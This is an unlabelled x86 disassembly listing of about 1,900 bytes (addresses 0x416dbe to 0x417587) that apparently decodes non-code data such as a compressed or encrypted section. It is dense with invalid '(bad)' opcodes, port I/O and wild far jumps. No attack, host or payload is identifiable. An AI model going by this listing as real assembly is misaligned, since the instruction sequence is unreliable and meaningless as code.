  416dbe:	scas   al,BYTE PTR es:[edi]
  416dbf:	mov    edi,eax
  416dc1:	pop    ecx
  416dc2:	int    0x6f
  416dc4:	mov    ebp,0xe369ab90
  416dc9:	ret    
  416dca:	cmp    eax,0xedf3cfc6
  416dcf:	je     0x416d5c
  416dd1:	add    eax,0xaf846acb
  416dd6:	out    dx,eax
  416dd7:	mov    eax,ds:0xa723bce3
  416ddc:	add    esi,ebx
  416dde:	dec    ecx
  416ddf:	es jbe 0x416e32
  416de2:	ins    BYTE PTR es:[edi],dx
  416de3:	add    BYTE PTR [ebp+0x1cc94208],al
  416de9:	cmp    ah,BYTE PTR [ebx-0x18091605]
  416def:	inc    edi
  416df0:	cmp    DWORD PTR [ebx],eax
  416df2:	xor    bh,dl
  416df4:	jge    0x416e44
  416df6:	mov    al,0xe2
  416df8:	jns    0x416d8a
  416dfa:	mov    ch,0xcd
  416dfc:	ds call 0xc2ff:0x326f5d66
  416e04:	pop    DWORD PTR [esp+ecx*8-0x4a0278ab]
  416e0b:	shl    BYTE PTR [ecx-0x726300a4],cl
  416e11:	mov    ecx,0xda3ee7ce
  416e16:	out    0x5a,al
  416e18:	xchg   edx,eax
  416e19:	test   cl,ch
  416e1b:	(bad)  
  416e1c:	pop    esi
  416e1d:	dec    esp
  416e1e:	out    dx,eax
  416e1f:	mov    ebp,0x4badd08d
  416e24:	sahf   
  416e25:	in     al,0xdb
  416e27:	jmp    0x42517ae5
  416e2c:	(bad)  [ecx]
  416e2e:	push   cs
  416e2f:	and    BYTE PTR [esi-0x551926f4],0x40
  416e36:	pusha  
  416e37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e38:	mov    ebx,0xfd275a24
  416e3d:	sahf   
  416e3e:	mov    ebp,0x4b6d261d
  416e43:	mov    bl,0xdc
  416e45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e46:	ins    DWORD PTR es:[edi],dx
  416e47:	(bad)  
  416e48:	out    dx,al
  416e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e4a:	aad    0x8e
  416e4c:	adc    edi,DWORD PTR [ecx+0x31fe4494]
  416e52:	repnz mov ds,WORD PTR [edx+0x4ae6cabf]
  416e59:	or     BYTE PTR [edi+edi*8+0x5428b5e8],al
  416e60:	or     eax,DWORD PTR [ebp+0x337d23ae]
  416e66:	aam    0xf
  416e68:	mov    ds:0x8928daf9,al
  416e6d:	jb     0x416e81
  416e6f:	adc    ebp,edx
  416e71:	jl     0x416e35
  416e73:	cmp    dl,bl
  416e75:	rcl    BYTE PTR [esi-0x31],0x82
  416e79:	loope  0x416ed0
  416e7b:	mov    dh,0x87
  416e7d:	mov    dl,0x88
  416e7f:	nop
  416e80:	inc    eax
  416e81:	sub    BYTE PTR [ebp-0x32],ch
  416e84:	js     0x416e4c
  416e86:	or     ch,BYTE PTR [edx+0x4b]
  416e89:	pop    ds
  416e8a:	mov    bl,0xe1
  416e8c:	cmp    dh,BYTE PTR [ebx-0x2d]
  416e8f:	adc    eax,DWORD PTR [esi+0x35]
  416e92:	test   al,0x50
  416e94:	xchg   esp,eax
  416e95:	and    eax,0x5a701e57
  416e9a:	pop    eax
  416e9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e9c:	and    DWORD PTR [ebx+0x60],ebx
  416e9f:	ss xor al,0x60
  416ea2:	fistp  QWORD PTR [ebp-0x4a]
  416ea5:	test   DWORD PTR [ebp+0x614edaf9],edx
  416eab:	push   edi
  416eac:	dec    esp
  416ead:	jl     0x416ef9
  416eaf:	iret   
  416eb0:	daa    
  416eb1:	in     al,0x3b
  416eb3:	mov    ebx,0xf9c994ff
  416eb8:	push   ecx
  416eb9:	aam    0xe9
  416ebb:	mov    dl,0xf
  416ebd:	or     al,0x48
  416ebf:	pushf  
  416ec0:	cmp    DWORD PTR [edx+eiz*4],ebp
  416ec3:	sub    eax,0x8b6baed5
  416ec8:	adc    ecx,ebp
  416eca:	push   eax
  416ecb:	sub    ebp,ebp
  416ecd:	push   es
  416ece:	push   edi
  416ecf:	cmp    al,dh
  416ed1:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  416ed3:	xor    BYTE PTR [edx-0x2ef8a17c],0xf3
  416eda:	and    eax,0x56f3ff3a
  416edf:	jo     0x416e6d
  416ee1:	popf   
  416ee2:	(bad)  
  416ee3:	out    dx,eax
  416ee4:	mov    esp,0xdf230696
  416ee9:	aaa    
  416eea:	inc    edx
  416eeb:	cmp    al,0xbd
  416eed:	mov    edi,0x4ad521de
  416ef2:	cs mov esi,0x4847dff6
  416ef8:	sar    edi,0x60
  416efb:	(bad)  
  416efc:	lods   al,BYTE PTR ds:[esi]
  416efd:	out    dx,eax
  416efe:	dec    ecx
  416eff:	sbb    eax,ebp
  416f01:	data16 jb 0x416f4c
  416f04:	adc    DWORD PTR [ebx*4-0x6975b4ae],esi
  416f0b:	xor    cl,BYTE PTR [ecx]
  416f0d:	rol    ah,0x7a
  416f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f11:	rcr    DWORD PTR [esi+0x5],1
  416f14:	mov    edi,0x2ca68b34
  416f19:	gs cli 
  416f1b:	sbb    bh,ch
  416f1d:	mov    ds:0xb68aae22,eax
  416f22:	sub    eax,0x5fb62322
  416f27:	fsub   DWORD PTR [ecx]
  416f29:	nop
  416f2a:	rcl    DWORD PTR [ecx],cl
  416f2c:	push   ecx
  416f2d:	popf   
  416f2e:	push   ds
  416f2f:	adc    al,0x6e
  416f31:	sbb    ch,BYTE PTR [edi]
  416f33:	(bad)  
  416f34:	ins    BYTE PTR es:[edi],dx
  416f35:	les    ebx,FWORD PTR [edx]
  416f37:	pop    edx
  416f38:	repz mov WORD PTR [ecx],cs
  416f3b:	ins    BYTE PTR es:[edi],dx
  416f3c:	add    eax,0xc271a0dd
  416f41:	push   esp
  416f42:	into   
  416f43:	mov    esp,DWORD PTR [eax+0x7b]
  416f46:	add    edi,DWORD PTR [eax]
  416f48:	sub    ch,ch
  416f4a:	gs jmp 0x416f50
  416f4d:	xchg   esp,eax
  416f4e:	outs   dx,DWORD PTR ds:[esi]
  416f4f:	fwait
  416f50:	dec    ebx
  416f51:	not    DWORD PTR [edi]
  416f53:	pusha  
  416f54:	mov    cl,0x54
  416f56:	or     esp,DWORD PTR [edx]
  416f58:	cs xchg esp,eax
  416f5a:	pop    ebp
  416f5b:	into   
  416f5c:	pop    edi
  416f5d:	sahf   
  416f5e:	inc    ecx
  416f5f:	call   0x4f06:0xeea39b8b
  416f66:	sbb    eax,0x270b31e8
  416f6b:	jae    0x416fa0
  416f6d:	cdq    
  416f6e:	in     eax,0xb1
  416f70:	jae    0x416f98
  416f72:	inc    esp
  416f73:	mov    cl,0xeb
  416f75:	or     DWORD PTR [eax],0xffffff99
  416f78:	cli    
  416f79:	mov    dh,0x67
  416f7b:	retf   
  416f7c:	dec    edx
  416f7d:	sbb    al,BYTE PTR [esi-0x4f485060]
  416f83:	xlat   BYTE PTR ds:[ebx]
  416f84:	cmp    BYTE PTR [ecx+0x7c],ah
  416f87:	adc    al,BYTE PTR [eax+0x25e2b979]
  416f8d:	pop    esp
  416f8e:	add    eax,0x3047a1be
  416f93:	sti    
  416f94:	xchg   edi,eax
  416f95:	das    
  416f96:	test   al,0x81
  416f98:	push   ecx
  416f99:	rcr    DWORD PTR [esi-0x18],1
  416f9c:	mov    DWORD PTR [ecx+0x41],edi
  416f9f:	mov    ah,0x47
  416fa1:	in     al,0x1d
  416fa3:	(bad)  
  416fa5:	jno    0x417001
  416fa7:	adc    al,0xa1
  416fa9:	test   BYTE PTR [ebx+eiz*2+0x47],cl
  416fad:	cld    
  416fae:	loopne 0x416f41
  416fb0:	fwait
  416fb1:	dec    esi
  416fb2:	mov    ?,eax
  416fb4:	cmp    DWORD PTR [edx-0x1a387920],0xffffffeb
  416fbb:	sub    esi,0xbbfe9ae
  416fc1:	push   eax
  416fc2:	loopne 0x416f57
  416fc4:	not    BYTE PTR [ebx+0x61ebd7cc]
  416fca:	mov    ds:0x69f96bf0,eax
  416fcf:	repz dec edx
  416fd1:	dec    ebx
  416fd2:	lock retf 
  416fd4:	xor    ch,BYTE PTR [ebp+0x7a]
  416fd7:	imul   ecx,DWORD PTR [edx+edi*4-0x26be120b],0x2728ef95
  416fe2:	fdiv   QWORD PTR [ebx+0x676751a5]
  416fe8:	sub    ebx,DWORD PTR [esi+0x73]
  416feb:	xor    DWORD PTR [ebp+0x44],edi
  416fee:	pop    ecx
  416fef:	mov    ch,0x58
  416ff1:	xchg   ebp,eax
  416ff2:	out    dx,al
  416ff3:	jno    0x416fe2
  416ff5:	cwde   
  416ff6:	int    0xd7
  416ff8:	fdiv   QWORD PTR [ebx+0x5b]
  416ffb:	inc    edi
  416ffc:	add    dh,BYTE PTR [esi-0x6f5f06c2]
  417002:	pop    edx
  417003:	rcr    DWORD PTR [ebx-0x25],cl
  417006:	mov    eax,ds:0xea6bbc31
  41700b:	push   ebx
  41700c:	imul   al
  41700e:	push   ds
  41700f:	test   ebp,0xd359c6fd
  417015:	or     BYTE PTR [ebp+0x2a],0xf0
  417019:	imul   ebx,DWORD PTR gs:[eax],0x5c6cf535
  417020:	sbb    DWORD PTR [bp+si+0x5f],ebp
  417024:	aaa    
  417025:	ins    BYTE PTR es:[edi],dx
  417026:	dec    esi
  417027:	jle    0x417000
  417029:	ret    0x164a
  41702c:	and    DWORD PTR [eax-0x4c],ebp
  41702f:	xchg   DWORD PTR [edi+0x1],eax
  417032:	ds hlt 
  417034:	mov    ds:0x19a7949d,eax
  417039:	jmp    0x15120ad2
  41703e:	and    DWORD PTR [eax-0x2],esi
  417041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417042:	mov    dh,0x8f
  417044:	or     eax,0xb5eb575d
  417049:	xchg   esi,eax
  41704a:	stos   DWORD PTR es:[edi],eax
  41704b:	push   edi
  41704c:	adc    eax,0x91d7d3a6
  417051:	sub    eax,0x1278ee34
  417056:	mov    al,0x92
  417058:	mov    al,ds:0x2f4cdad3
  41705d:	in     eax,dx
  41705e:	pop    ebx
  41705f:	iret   
  417060:	inc    eax
  417061:	(bad)
  417064:	(bad)  
  417065:	out    0x92,eax
  417067:	inc    ebx
  417068:	xor    eax,0x3a8c7fd5
  41706d:	adc    bh,al
  41706f:	adc    eax,DWORD PTR [ebp+0x5b6a01b0]
  417075:	lds    edi,FWORD PTR ds:0xbe1be742
  41707b:	dec    esp
  41707c:	ja     0x417082
  41707e:	mov    WORD PTR [ecx-0x1e29bfc3],ss
  417084:	es pop es
  417086:	pop    esi
  417087:	push   esi
  417088:	imul   esp,DWORD PTR [ecx-0x73],0x4c052b2c
  41708f:	xor    al,0xe4
  417091:	push   esp
  417092:	pop    ss
  417093:	or     DWORD PTR [ecx-0x775cb26d],esp
  417099:	or     cl,cl
  41709b:	jge    0x417060
  41709d:	xchg   esi,eax
  41709e:	div    BYTE PTR [esi]
  4170a0:	push   esp
  4170a1:	push   ss
  4170a2:	lods   al,BYTE PTR ds:[esi]
  4170a3:	in     al,dx
  4170a4:	cmp    eax,0xe29d5433
  4170a9:	lahf   
  4170aa:	pop    ecx
  4170ab:	stos   DWORD PTR es:[edi],eax
  4170ac:	pop    esp
  4170ad:	ins    BYTE PTR es:[edi],dx
  4170ae:	and    BYTE PTR [eax-0x36],ch
  4170b1:	mov    al,ds:0x6febc556
  4170b6:	or     edx,DWORD PTR [ebx]
  4170b8:	jp     0x417043
  4170ba:	shl    cl,cl
  4170bc:	mov    ds:0x4ebbc0b9,eax
  4170c1:	mov    ebp,DWORD PTR [ebx-0x33034e7]
  4170c7:	aam    0x8e
  4170c9:	or     DWORD PTR [ebx-0x47],edx
  4170cc:	retf   
  4170cd:	das    
  4170ce:	jle    0x4170d1
  4170d0:	lds    esi,FWORD PTR [bx]
  4170d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170d4:	fdivr  DWORD PTR [edx-0x3f]
  4170d7:	cmp    DWORD PTR [eax],ecx
  4170d9:	stos   BYTE PTR es:[edi],al
  4170da:	bnd jbe 0x41707f
  4170dd:	aas    
  4170de:	and    ah,BYTE PTR [edi]
  4170e0:	cmp    DWORD PTR [ebp+0x41],edi
  4170e3:	and    ebx,DWORD PTR [ecx]
  4170e5:	adc    eax,0x866c682a
  4170ea:	cmp    al,cl
  4170ec:	push   ecx
  4170ed:	lea    edi,[ecx+edi*1+0x78]
  4170f1:	je     0x41710a
  4170f3:	gs inc ebx
  4170f5:	cdq    
  4170f6:	push   ebp
  4170f7:	and    BYTE PTR ds:0x75cb9886,bl
  4170fd:	jl     0x417113
  4170ff:	arpl   ax,si
  417101:	pop    edi
  417102:	pop    ds
  417103:	cmp    eax,0x8019746f
  417108:	xor    eax,0x1c0a3944
  41710d:	data16 loopne 0x41715b
  417110:	and    DWORD PTR [esi-0x11],0x9621a0f5
  417117:	aam    0x71
  417119:	ins    DWORD PTR es:[edi],dx
  41711a:	xchg   edi,eax
  41711b:	pop    ebx
  41711c:	fild   WORD PTR [edi]
  41711e:	inc    esp
  41711f:	arpl   WORD PTR [edx-0x60a2dcc1],cx
  417125:	and    BYTE PTR [ebx+0x7856a470],0x61
  41712c:	xchg   edx,eax
  41712d:	lds    ebx,FWORD PTR [ebx]
  41712f:	xor    ah,BYTE PTR [ecx]
  417131:	arpl   WORD PTR [ecx+eiz*2-0x7c0157b2],sp
  417138:	call   0xe4533f8c
  41713d:	mov    cl,0x62
  41713f:	mov    cl,0xeb
  417141:	scas   al,BYTE PTR es:[edi]
  417142:	loop   0x417144
  417144:	and    al,0x4c
  417146:	and    al,0x97
  417148:	in     eax,dx
  417149:	xchg   esi,eax
  41714a:	gs jne 0x4171c2
  41714d:	rcl    esi,0x91
  417150:	out    0xd7,eax
  417152:	pop    ebp
  417153:	imul   esi,DWORD PTR ds:0xf753b94a,0x817bfd81
  41715d:	xchg   ebp,eax
  41715e:	jg     0x4171d7
  417160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417161:	mov    ?,WORD PTR [edi]
  417163:	push   edx
  417164:	shl    BYTE PTR [ebx+0x9],0x44
  417168:	sbb    al,BYTE PTR [edx-0xb]
  41716b:	and    BYTE PTR [edi-0xf],0xc5
  41716f:	mov    ds:0x31b3db5,al
  417174:	push   esi
  417175:	das    
  417176:	in     eax,dx
  417177:	push   eax
  417178:	pop    es
  417179:	in     eax,0x25
  41717b:	mov    ds:0xb9eec41b,eax
  417181:	xor    eax,0x4a07460d
  417186:	inc    edi
  417187:	jbe    0x417192
  417189:	pushf  
  41718a:	xor    DWORD PTR [esi-0x2ff5db81],eax
  417190:	and    ch,0x3e
  417193:	mov    ds:0x3b556583,al
  417198:	ss retf 0x457e
  41719c:	sbb    bh,bh
  41719e:	xchg   ebp,eax
  41719f:	mov    bl,0x9b
  4171a1:	pop    ebp
  4171a2:	xchg   BYTE PTR [eax+0x469c49e0],ah
  4171a8:	inc    ebp
  4171a9:	lds    esi,FWORD PTR [edi-0xb]
  4171ac:	push   ebx
  4171ad:	gs out dx,al
  4171af:	xchg   ebp,eax
  4171b0:	js     0x4171d2
  4171b2:	xchg   edi,eax
  4171b3:	loop   0x417192
  4171b5:	mov    bl,0xf9
  4171b7:	out    dx,eax
  4171b8:	mov    esi,0x890b0acd
  4171bd:	loopne 0x4171cc
  4171bf:	fwait
  4171c0:	xchg   BYTE PTR [ebx],al
  4171c2:	pop    ds
  4171c3:	lea    edx,[edx-0x32]
  4171c6:	sub    BYTE PTR [edx-0x3acc60c1],dh
  4171cc:	ss (bad) 
  4171ce:	mov    ebp,0xeaf2a9f4
  4171d3:	dec    ebx
  4171d4:	jmp    0x4171c3
  4171d6:	rol    BYTE PTR ds:0x10c6e45d,0x19
  4171dd:	(bad)  
  4171de:	stc    
  4171df:	in     eax,0x6b
  4171e1:	xlat   BYTE PTR ds:[ebx]
  4171e2:	jge    0x4171b6
  4171e4:	and    eax,0xcfad4e49
  4171e9:	aad    0x9b
  4171eb:	in     al,0x6c
  4171ed:	fiadd  DWORD PTR [ebx+0x7d71db7]
  4171f3:	jno    0x4171ea
  4171f5:	ror    DWORD PTR [eax],cl
  4171f7:	xchg   esp,eax
  4171f8:	in     eax,0x36
  4171fa:	ds test al,0xc9
  4171fd:	sar    DWORD PTR [ebp-0x47],1
  417200:	dec    eax
  417201:	retf   0x4ad4
  417204:	or     DWORD PTR [ecx],eax
  417206:	cmp    ch,BYTE PTR [edx+ecx*8]
  417209:	inc    edx
  41720a:	lds    eax,FWORD PTR [ecx+0x1f0f0959]
  417210:	std    
  417211:	cmp    BYTE PTR [esi+0x76],ah
  417214:	adc    eax,0xb6d974c1
  417219:	adc    al,0x5
  41721b:	loopne 0x41722a
  41721d:	mov    ecx,0xf50f52ce
  417222:	mov    bl,dh
  417224:	mov    edx,0x172f3242
  417229:	jmp    0xaaac:0x6406d596
  417230:	clc    
  417231:	or     DWORD PTR [esi+ebx*1],ebp
  417234:	icebp  
  417235:	dec    ecx
  417236:	(bad)  
  417238:	pop    ebx
  417239:	mov    dh,0xce
  41723b:	hlt    
  41723c:	ret    
  41723d:	dec    esi
  41723e:	les    eax,FWORD PTR [edx]
  417240:	sub    eax,0x8b485502
  417245:	clc    
  417246:	popa   
  417247:	lods   eax,DWORD PTR ds:[esi]
  417248:	inc    ebx
  417249:	mov    al,0x73
  41724b:	loope  0x4172b6
  41724d:	out    0x5d,al
  41724f:	push   ss
  417250:	jne    0x417246
  417252:	mov    eax,ds:0xd21247e6
  417257:	fistp  QWORD PTR [ebx-0x1e]
  41725a:	iret   
  41725b:	push   edi
  41725c:	xchg   edx,eax
  41725d:	in     al,dx
  41725e:	jp     0x417274
  417260:	inc    edx
  417261:	not    dl
  417263:	xchg   BYTE PTR [esp+eax*2+0x3b95a82],al
  41726a:	xor    edi,ebx
  41726c:	fnstsw WORD PTR [edi+0x4da4f8ce]
  417272:	test   eax,0xe89cef4b
  417277:	add    al,BYTE PTR [esi+0x7010594a]
  41727d:	(bad)  [esi*4+0xf1ce820]
  417284:	(bad)  [ecx+0x29fa2dad]
  41728a:	adc    bh,BYTE PTR [esp+esi*1+0x65]
  41728e:	adc    DWORD PTR [edx+0x4bc15824],esi
  417294:	xchg   ebp,eax
  417295:	add    DWORD PTR [edx],eax
  417297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417298:	push   ebp
  417299:	addr16 repnz gs or dl,bl
  41729e:	je     0x4172b5
  4172a0:	sbb    eax,0x634e9731
  4172a5:	retf   
  4172a6:	xlat   BYTE PTR ds:[ebx]
  4172a7:	cmp    BYTE PTR [ecx+0x1d],al
  4172aa:	jg     0x4172d1
  4172ac:	add    al,0x60
  4172ae:	fcomp  QWORD PTR [eax+0x14]
  4172b1:	loope  0x4172ee
  4172b3:	int3   
  4172b4:	and    al,dh
  4172b6:	aaa    
  4172b7:	repz dec ebx
  4172b9:	mov    edx,0xfec7a4e
  4172be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172bf:	xor    al,0xcb
  4172c1:	and    eax,DWORD PTR [ecx-0x64c6dc16]
  4172c7:	mov    ah,ah
  4172c9:	call   0x1ff1a3e7
  4172ce:	and    BYTE PTR [ecx-0x17],bh
  4172d1:	cmp    edi,DWORD PTR [esi-0x58]
  4172d4:	sahf   
  4172d5:	dec    eax
  4172d6:	xchg   edi,eax
  4172d7:	push   es
  4172d8:	sbb    BYTE PTR [esi-0x63352ae3],bh
  4172de:	xlat   BYTE PTR ds:[ebx]
  4172df:	cmp    dl,ah
  4172e1:	(bad)  
  4172e2:	loope  0x417359
  4172e4:	mov    al,0x19
  4172e6:	jg     0x4172c1
  4172e8:	mov    ds:0x18e00719,al
  4172ed:	xchg   BYTE PTR [edx+0x692c2f50],bl
  4172f3:	adc    DWORD PTR [ebx+eax*2],esp
  4172f6:	jle    0x417329
  4172f8:	sub    ch,ah
  4172fa:	pusha  
  4172fb:	xor    al,0x6f
  4172fd:	inc    edi
  4172fe:	pop    edi
  4172ff:	stc    
  417300:	jbe    0x4172f6
  417302:	adc    edx,esp
  417304:	adc    esp,esi
  417306:	pusha  
  417307:	mov    ds:0xfe20d2e3,al
  41730c:	mov    al,ds:0x56ec1ef1
  417311:	jb     0x4172aa
  417313:	ss (bad) 
  417315:	fbld   TBYTE PTR [esi-0x7a]
  417318:	push   0x3b
  41731a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41731b:	mov    ds:0xb993ae95,eax
  417320:	js     0x417390
  417322:	ret    0xff5e
  417325:	div    edi
  417327:	mov    al,ds:0x50531ef7
  41732c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41732d:	call   0xa5b84c08
  417332:	push   esp
  417333:	out    dx,al
  417334:	xchg   ebx,eax
  417335:	out    dx,al
  417336:	retf   
  417337:	pop    ebp
  417338:	jb     0x41735a
  41733a:	jnp    0xa182daf5
  417340:	nop
  417341:	push   ds
  417342:	in     eax,0xb2
  417344:	mov    bl,0xb1
  417346:	scas   eax,DWORD PTR es:[edi]
  417347:	data16 je 0x4173b6
  41734a:	imul   BYTE PTR [ebp+0x51751957]
  417350:	stc    
  417351:	jns    0x4172e6
  417353:	fisubr DWORD PTR [ebx+ebx*8-0x68]
  417357:	adc    eax,0xe8c7ecf4
  41735c:	int    0x26
  41735e:	pop    ds
  41735f:	cmp    eax,0xe268b6a3
  417364:	jmp    0x4173c2
  417366:	jne    0x417313
  417368:	mov    WORD PTR [eax],fs
  41736a:	(bad)  
  41736b:	jne    0x4172f3
  41736d:	cmp    ebx,DWORD PTR [edx]
  41736f:	inc    esp
  417370:	cmc    
  417371:	aas    
  417372:	dec    edx
  417373:	out    0xf9,al
  417375:	in     eax,dx
  417376:	sub    ebx,esp
  417378:	sub    esi,0xd00b8d19
  41737e:	retf   
  41737f:	pop    esi
  417380:	outs   dx,DWORD PTR ds:[esi]
  417381:	loop   0x4173e0
  417383:	out    dx,eax
  417384:	jb     0x41734a
  417386:	std    
  417387:	add    esi,ebp
  417389:	ret    
  41738a:	pop    ds
  41738b:	xor    edi,ecx
  41738d:	stc    
  41738e:	inc    ecx
  41738f:	sar    DWORD PTR [ecx-0x13],0xd0
  417393:	in     eax,0xa7
  417395:	cmc    
  417396:	rcl    DWORD PTR [ebp+0x78],1
  417399:	jnp    0x4173af
  41739b:	lods   al,BYTE PTR ds:[esi]
  41739c:	and    bh,dh
  41739e:	xchg   edx,eax
  41739f:	dec    esp
  4173a0:	inc    esi
  4173a1:	push   0x419c1857
  4173a6:	out    0xaf,al
  4173a8:	xchg   edx,eax
  4173a9:	and    al,0x30
  4173ab:	mov    ebx,0x5d839dce
  4173b0:	add    DWORD PTR [eax+0x5b],ecx
  4173b3:	(bad)  
  4173b4:	xor    BYTE PTR [ecx-0x70f13b3b],bl
  4173ba:	out    dx,eax
  4173bb:	retf   0x88cc
  4173be:	dec    edi
  4173bf:	xchg   edi,eax
  4173c0:	xchg   DWORD PTR [edi-0x25],edx
  4173c3:	ins    DWORD PTR es:[edi],dx
  4173c4:	cdq    
  4173c5:	mov    ebp,0x36f1a39e
  4173ca:	(bad)  
  4173cb:	in     eax,dx
  4173cc:	sub    al,0xdd
  4173ce:	addr16 push cs
  4173d0:	xor    al,0x77
  4173d2:	xchg   edi,eax
  4173d3:	(bad)  
  4173d5:	les    esi,FWORD PTR [ecx+0x1adf7f0e]
  4173db:	adc    DWORD PTR [edx-0x73334772],esi
  4173e1:	inc    ebp
  4173e2:	mov    eax,0x34b52bd8
  4173e7:	mov    dl,0x1f
  4173e9:	dec    edx
  4173ea:	std    
  4173eb:	mov    DWORD PTR [edi+0x1e],ebx
  4173ee:	jno    0x417425
  4173f0:	mov    cl,0x72
  4173f2:	fnstenv [esi+0x1afb7a78]
  4173f8:	in     al,0x6a
  4173fa:	mov    WORD PTR [esi-0x7b7bf0c9],fs
  417400:	push   ecx
  417401:	xchg   edx,eax
  417402:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417403:	out    0xa8,al
  417405:	mov    al,0x62
  417407:	sub    edi,DWORD PTR [ebp-0x66]
  41740a:	scas   eax,DWORD PTR es:[edi]
  41740b:	rcl    BYTE PTR [ecx+0x52],1
  41740e:	mov    WORD PTR [ebx],fs
  417410:	or     eax,0x71bf812f
  417415:	push   0xffffffc4
  417417:	jo     0xf4762026
  41741d:	inc    edi
  41741e:	sbb    ebp,eax
  417420:	stos   BYTE PTR es:[edi],al
  417421:	push   ebx
  417422:	mov    ecx,DWORD PTR [ecx]
  417424:	inc    esi
  417425:	cld    
  417426:	call   0x929:0x3868f8d3
  41742d:	mov    ss,WORD PTR [edx+0x738ed23b]
  417433:	mov    WORD PTR [edx],fs
  417435:	shr    DWORD PTR [esi-0x1a],1
  417438:	pop    edi
  417439:	fs dec eax
  41743b:	sbb    al,0xd7
  41743d:	in     al,0x9e
  41743f:	xor    al,0x14
  417441:	pop    ss
  417442:	add    esi,DWORD PTR [ebx+esi*2-0x3070ae33]
  417449:	aam    0xb3
  41744b:	test   al,0x6c
  41744d:	mov    edi,0x63b9f86d
  417452:	mov    dh,0xb4
  417454:	add    DWORD PTR [ebx],0x2a
  417457:	push   0x35366dc3
  41745c:	fmul   QWORD PTR [edi-0x5272d4b9]
  417462:	adc    edi,esp
  417464:	fstp   DWORD PTR [eax-0x42]
  417467:	pop    ebp
  417468:	aaa    
  417469:	jecxz  0x417425
  41746b:	out    0x2b,al
  41746d:	inc    esi
  41746e:	xchg   edi,eax
  41746f:	lods   eax,DWORD PTR ds:[esi]
  417470:	lea    esp,[ebx+eiz*4]
  417473:	sar    esi,0xaf
  417476:	sbb    BYTE PTR [ebx+0x16],cl
  417479:	shl    BYTE PTR [edx-0x414af980],cl
  41747f:	mov    cl,0x7b
  417481:	scas   al,BYTE PTR es:[edi]
  417482:	sbb    BYTE PTR [edx+0x2f3f8cfc],ah
  417488:	lock mov al,ds:0x375819bd
  41748e:	dec    esp
  41748f:	xor    al,0x1a
  417491:	shr    DWORD PTR [ecx],cl
  417493:	inc    esp
  417494:	cdq    
  417495:	push   cs
  417496:	mov    BYTE PTR gs:[edi+0x28b7ef5a],dh
  41749d:	and    eax,0x3834e218
  4174a2:	pop    ebp
  4174a3:	cmp    ecx,DWORD PTR ds:0xf3a0dea4
  4174a9:	std    
  4174aa:	mov    ?,WORD PTR [edi-0xd]
  4174ad:	pop    es
  4174ae:	cmp    BYTE PTR [edx],dl
  4174b0:	jg     0x417440
  4174b2:	mov    BYTE PTR [ebp+0x45],0xb2
  4174b6:	or     ecx,DWORD PTR ds:[eax+esi*1+0x6e]
  4174bb:	mov    ecx,0x3823846b
  4174c0:	in     al,dx
  4174c1:	or     ah,BYTE PTR [esi+0x41]
  4174c4:	or     esp,DWORD PTR [edx+0x58]
  4174c7:	adc    BYTE PTR [eax-0xf],ah
  4174ca:	jl     0x417472
  4174cc:	clc    
  4174cd:	imul   edx,DWORD PTR [edx+0x58a3a7b4],0x818f875e
  4174d7:	ds sub al,0xcf
  4174da:	popa   
  4174db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174dc:	call   0x5e02dd14
  4174e1:	mov    dh,0x4a
  4174e3:	mov    eax,0x7a725799
  4174e8:	sti    
  4174e9:	shr    DWORD PTR [eax],1
  4174eb:	mov    edx,esi
  4174ed:	je     0x4174ce
  4174ef:	adc    DWORD PTR [ebp-0x631d56f],eax
  4174f5:	mov    edi,0x196f8d03
  4174fa:	mov    bh,0x89
  4174fc:	push   edi
  4174fd:	sbb    bh,cl
  4174ff:	dec    esp
  417500:	icebp  
  417501:	xor    al,0x85
  417503:	sub    al,0x20
  417505:	adc    ch,dl
  417507:	(bad)  
  417508:	pop    ds
  417509:	mov    ds:0x659b776d,eax
  41750e:	xchg   BYTE PTR [ebp+edx*4+0x2116255b],al
  417515:	fdiv   QWORD PTR [eax+0x56]
  417518:	inc    edi
  417519:	mov    bl,0xc4
  41751b:	das    
  41751c:	aad    0x8
  41751e:	out    dx,al
  41751f:	lds    esp,FWORD PTR [esi]
  417521:	sbb    eax,0x8943cf3b
  417526:	repnz pop ss
  417528:	pop    ebp
  417529:	arpl   WORD PTR [ebx+0x3b],bx
  41752c:	cmp    eax,0xa476180c
  417531:	sbb    DWORD PTR [edi+0x7a],eax
  417534:	imul   esp,ecx,0x32
  417537:	scas   al,BYTE PTR es:[edi]
  417538:	mov    ds:0xc4af262c,al
  41753d:	repnz cmp BYTE PTR [edx],dl
  417540:	xor    BYTE PTR [edi],al
  417542:	jnp    0x4174cb
  417544:	dec    ecx
  417545:	loope  0x417544
  417547:	cld    
  417548:	xchg   DWORD PTR ds:0x5df9231d,ecx
  41754e:	lods   al,BYTE PTR ds:[esi]
  41754f:	add    cl,al
  417551:	xchg   ebp,eax
  417552:	adc    eax,0x77b1e2d0
  417557:	iret   
  417558:	je     0x417573
  41755a:	xchg   edx,eax
  41755b:	outs   dx,DWORD PTR ds:[esi]
  41755c:	shr    ch,1
  41755e:	adc    al,0xf1
  417560:	dec    ebx
  417561:	inc    ecx
  417562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417563:	xor    edx,ecx
  417565:	push   edi
  417566:	sbb    esi,DWORD PTR [eax-0x5c]
  417569:	dec    edi
  41756a:	push   esi
  41756b:	les    edi,FWORD PTR ds:0x1c71dc66
  417571:	test   BYTE PTR [eax-0x6],0x3f
  417575:	test   bh,ah
  417577:	push   esp
  417578:	xor    DWORD PTR [edx],edi
  41757a:	and    eax,0x16548d0f
  41757f:	mov    eax,ds:0x4db8794c
  417584:	jmp    FWORD PTR [edx-0x5]
  417587:	gs pop es
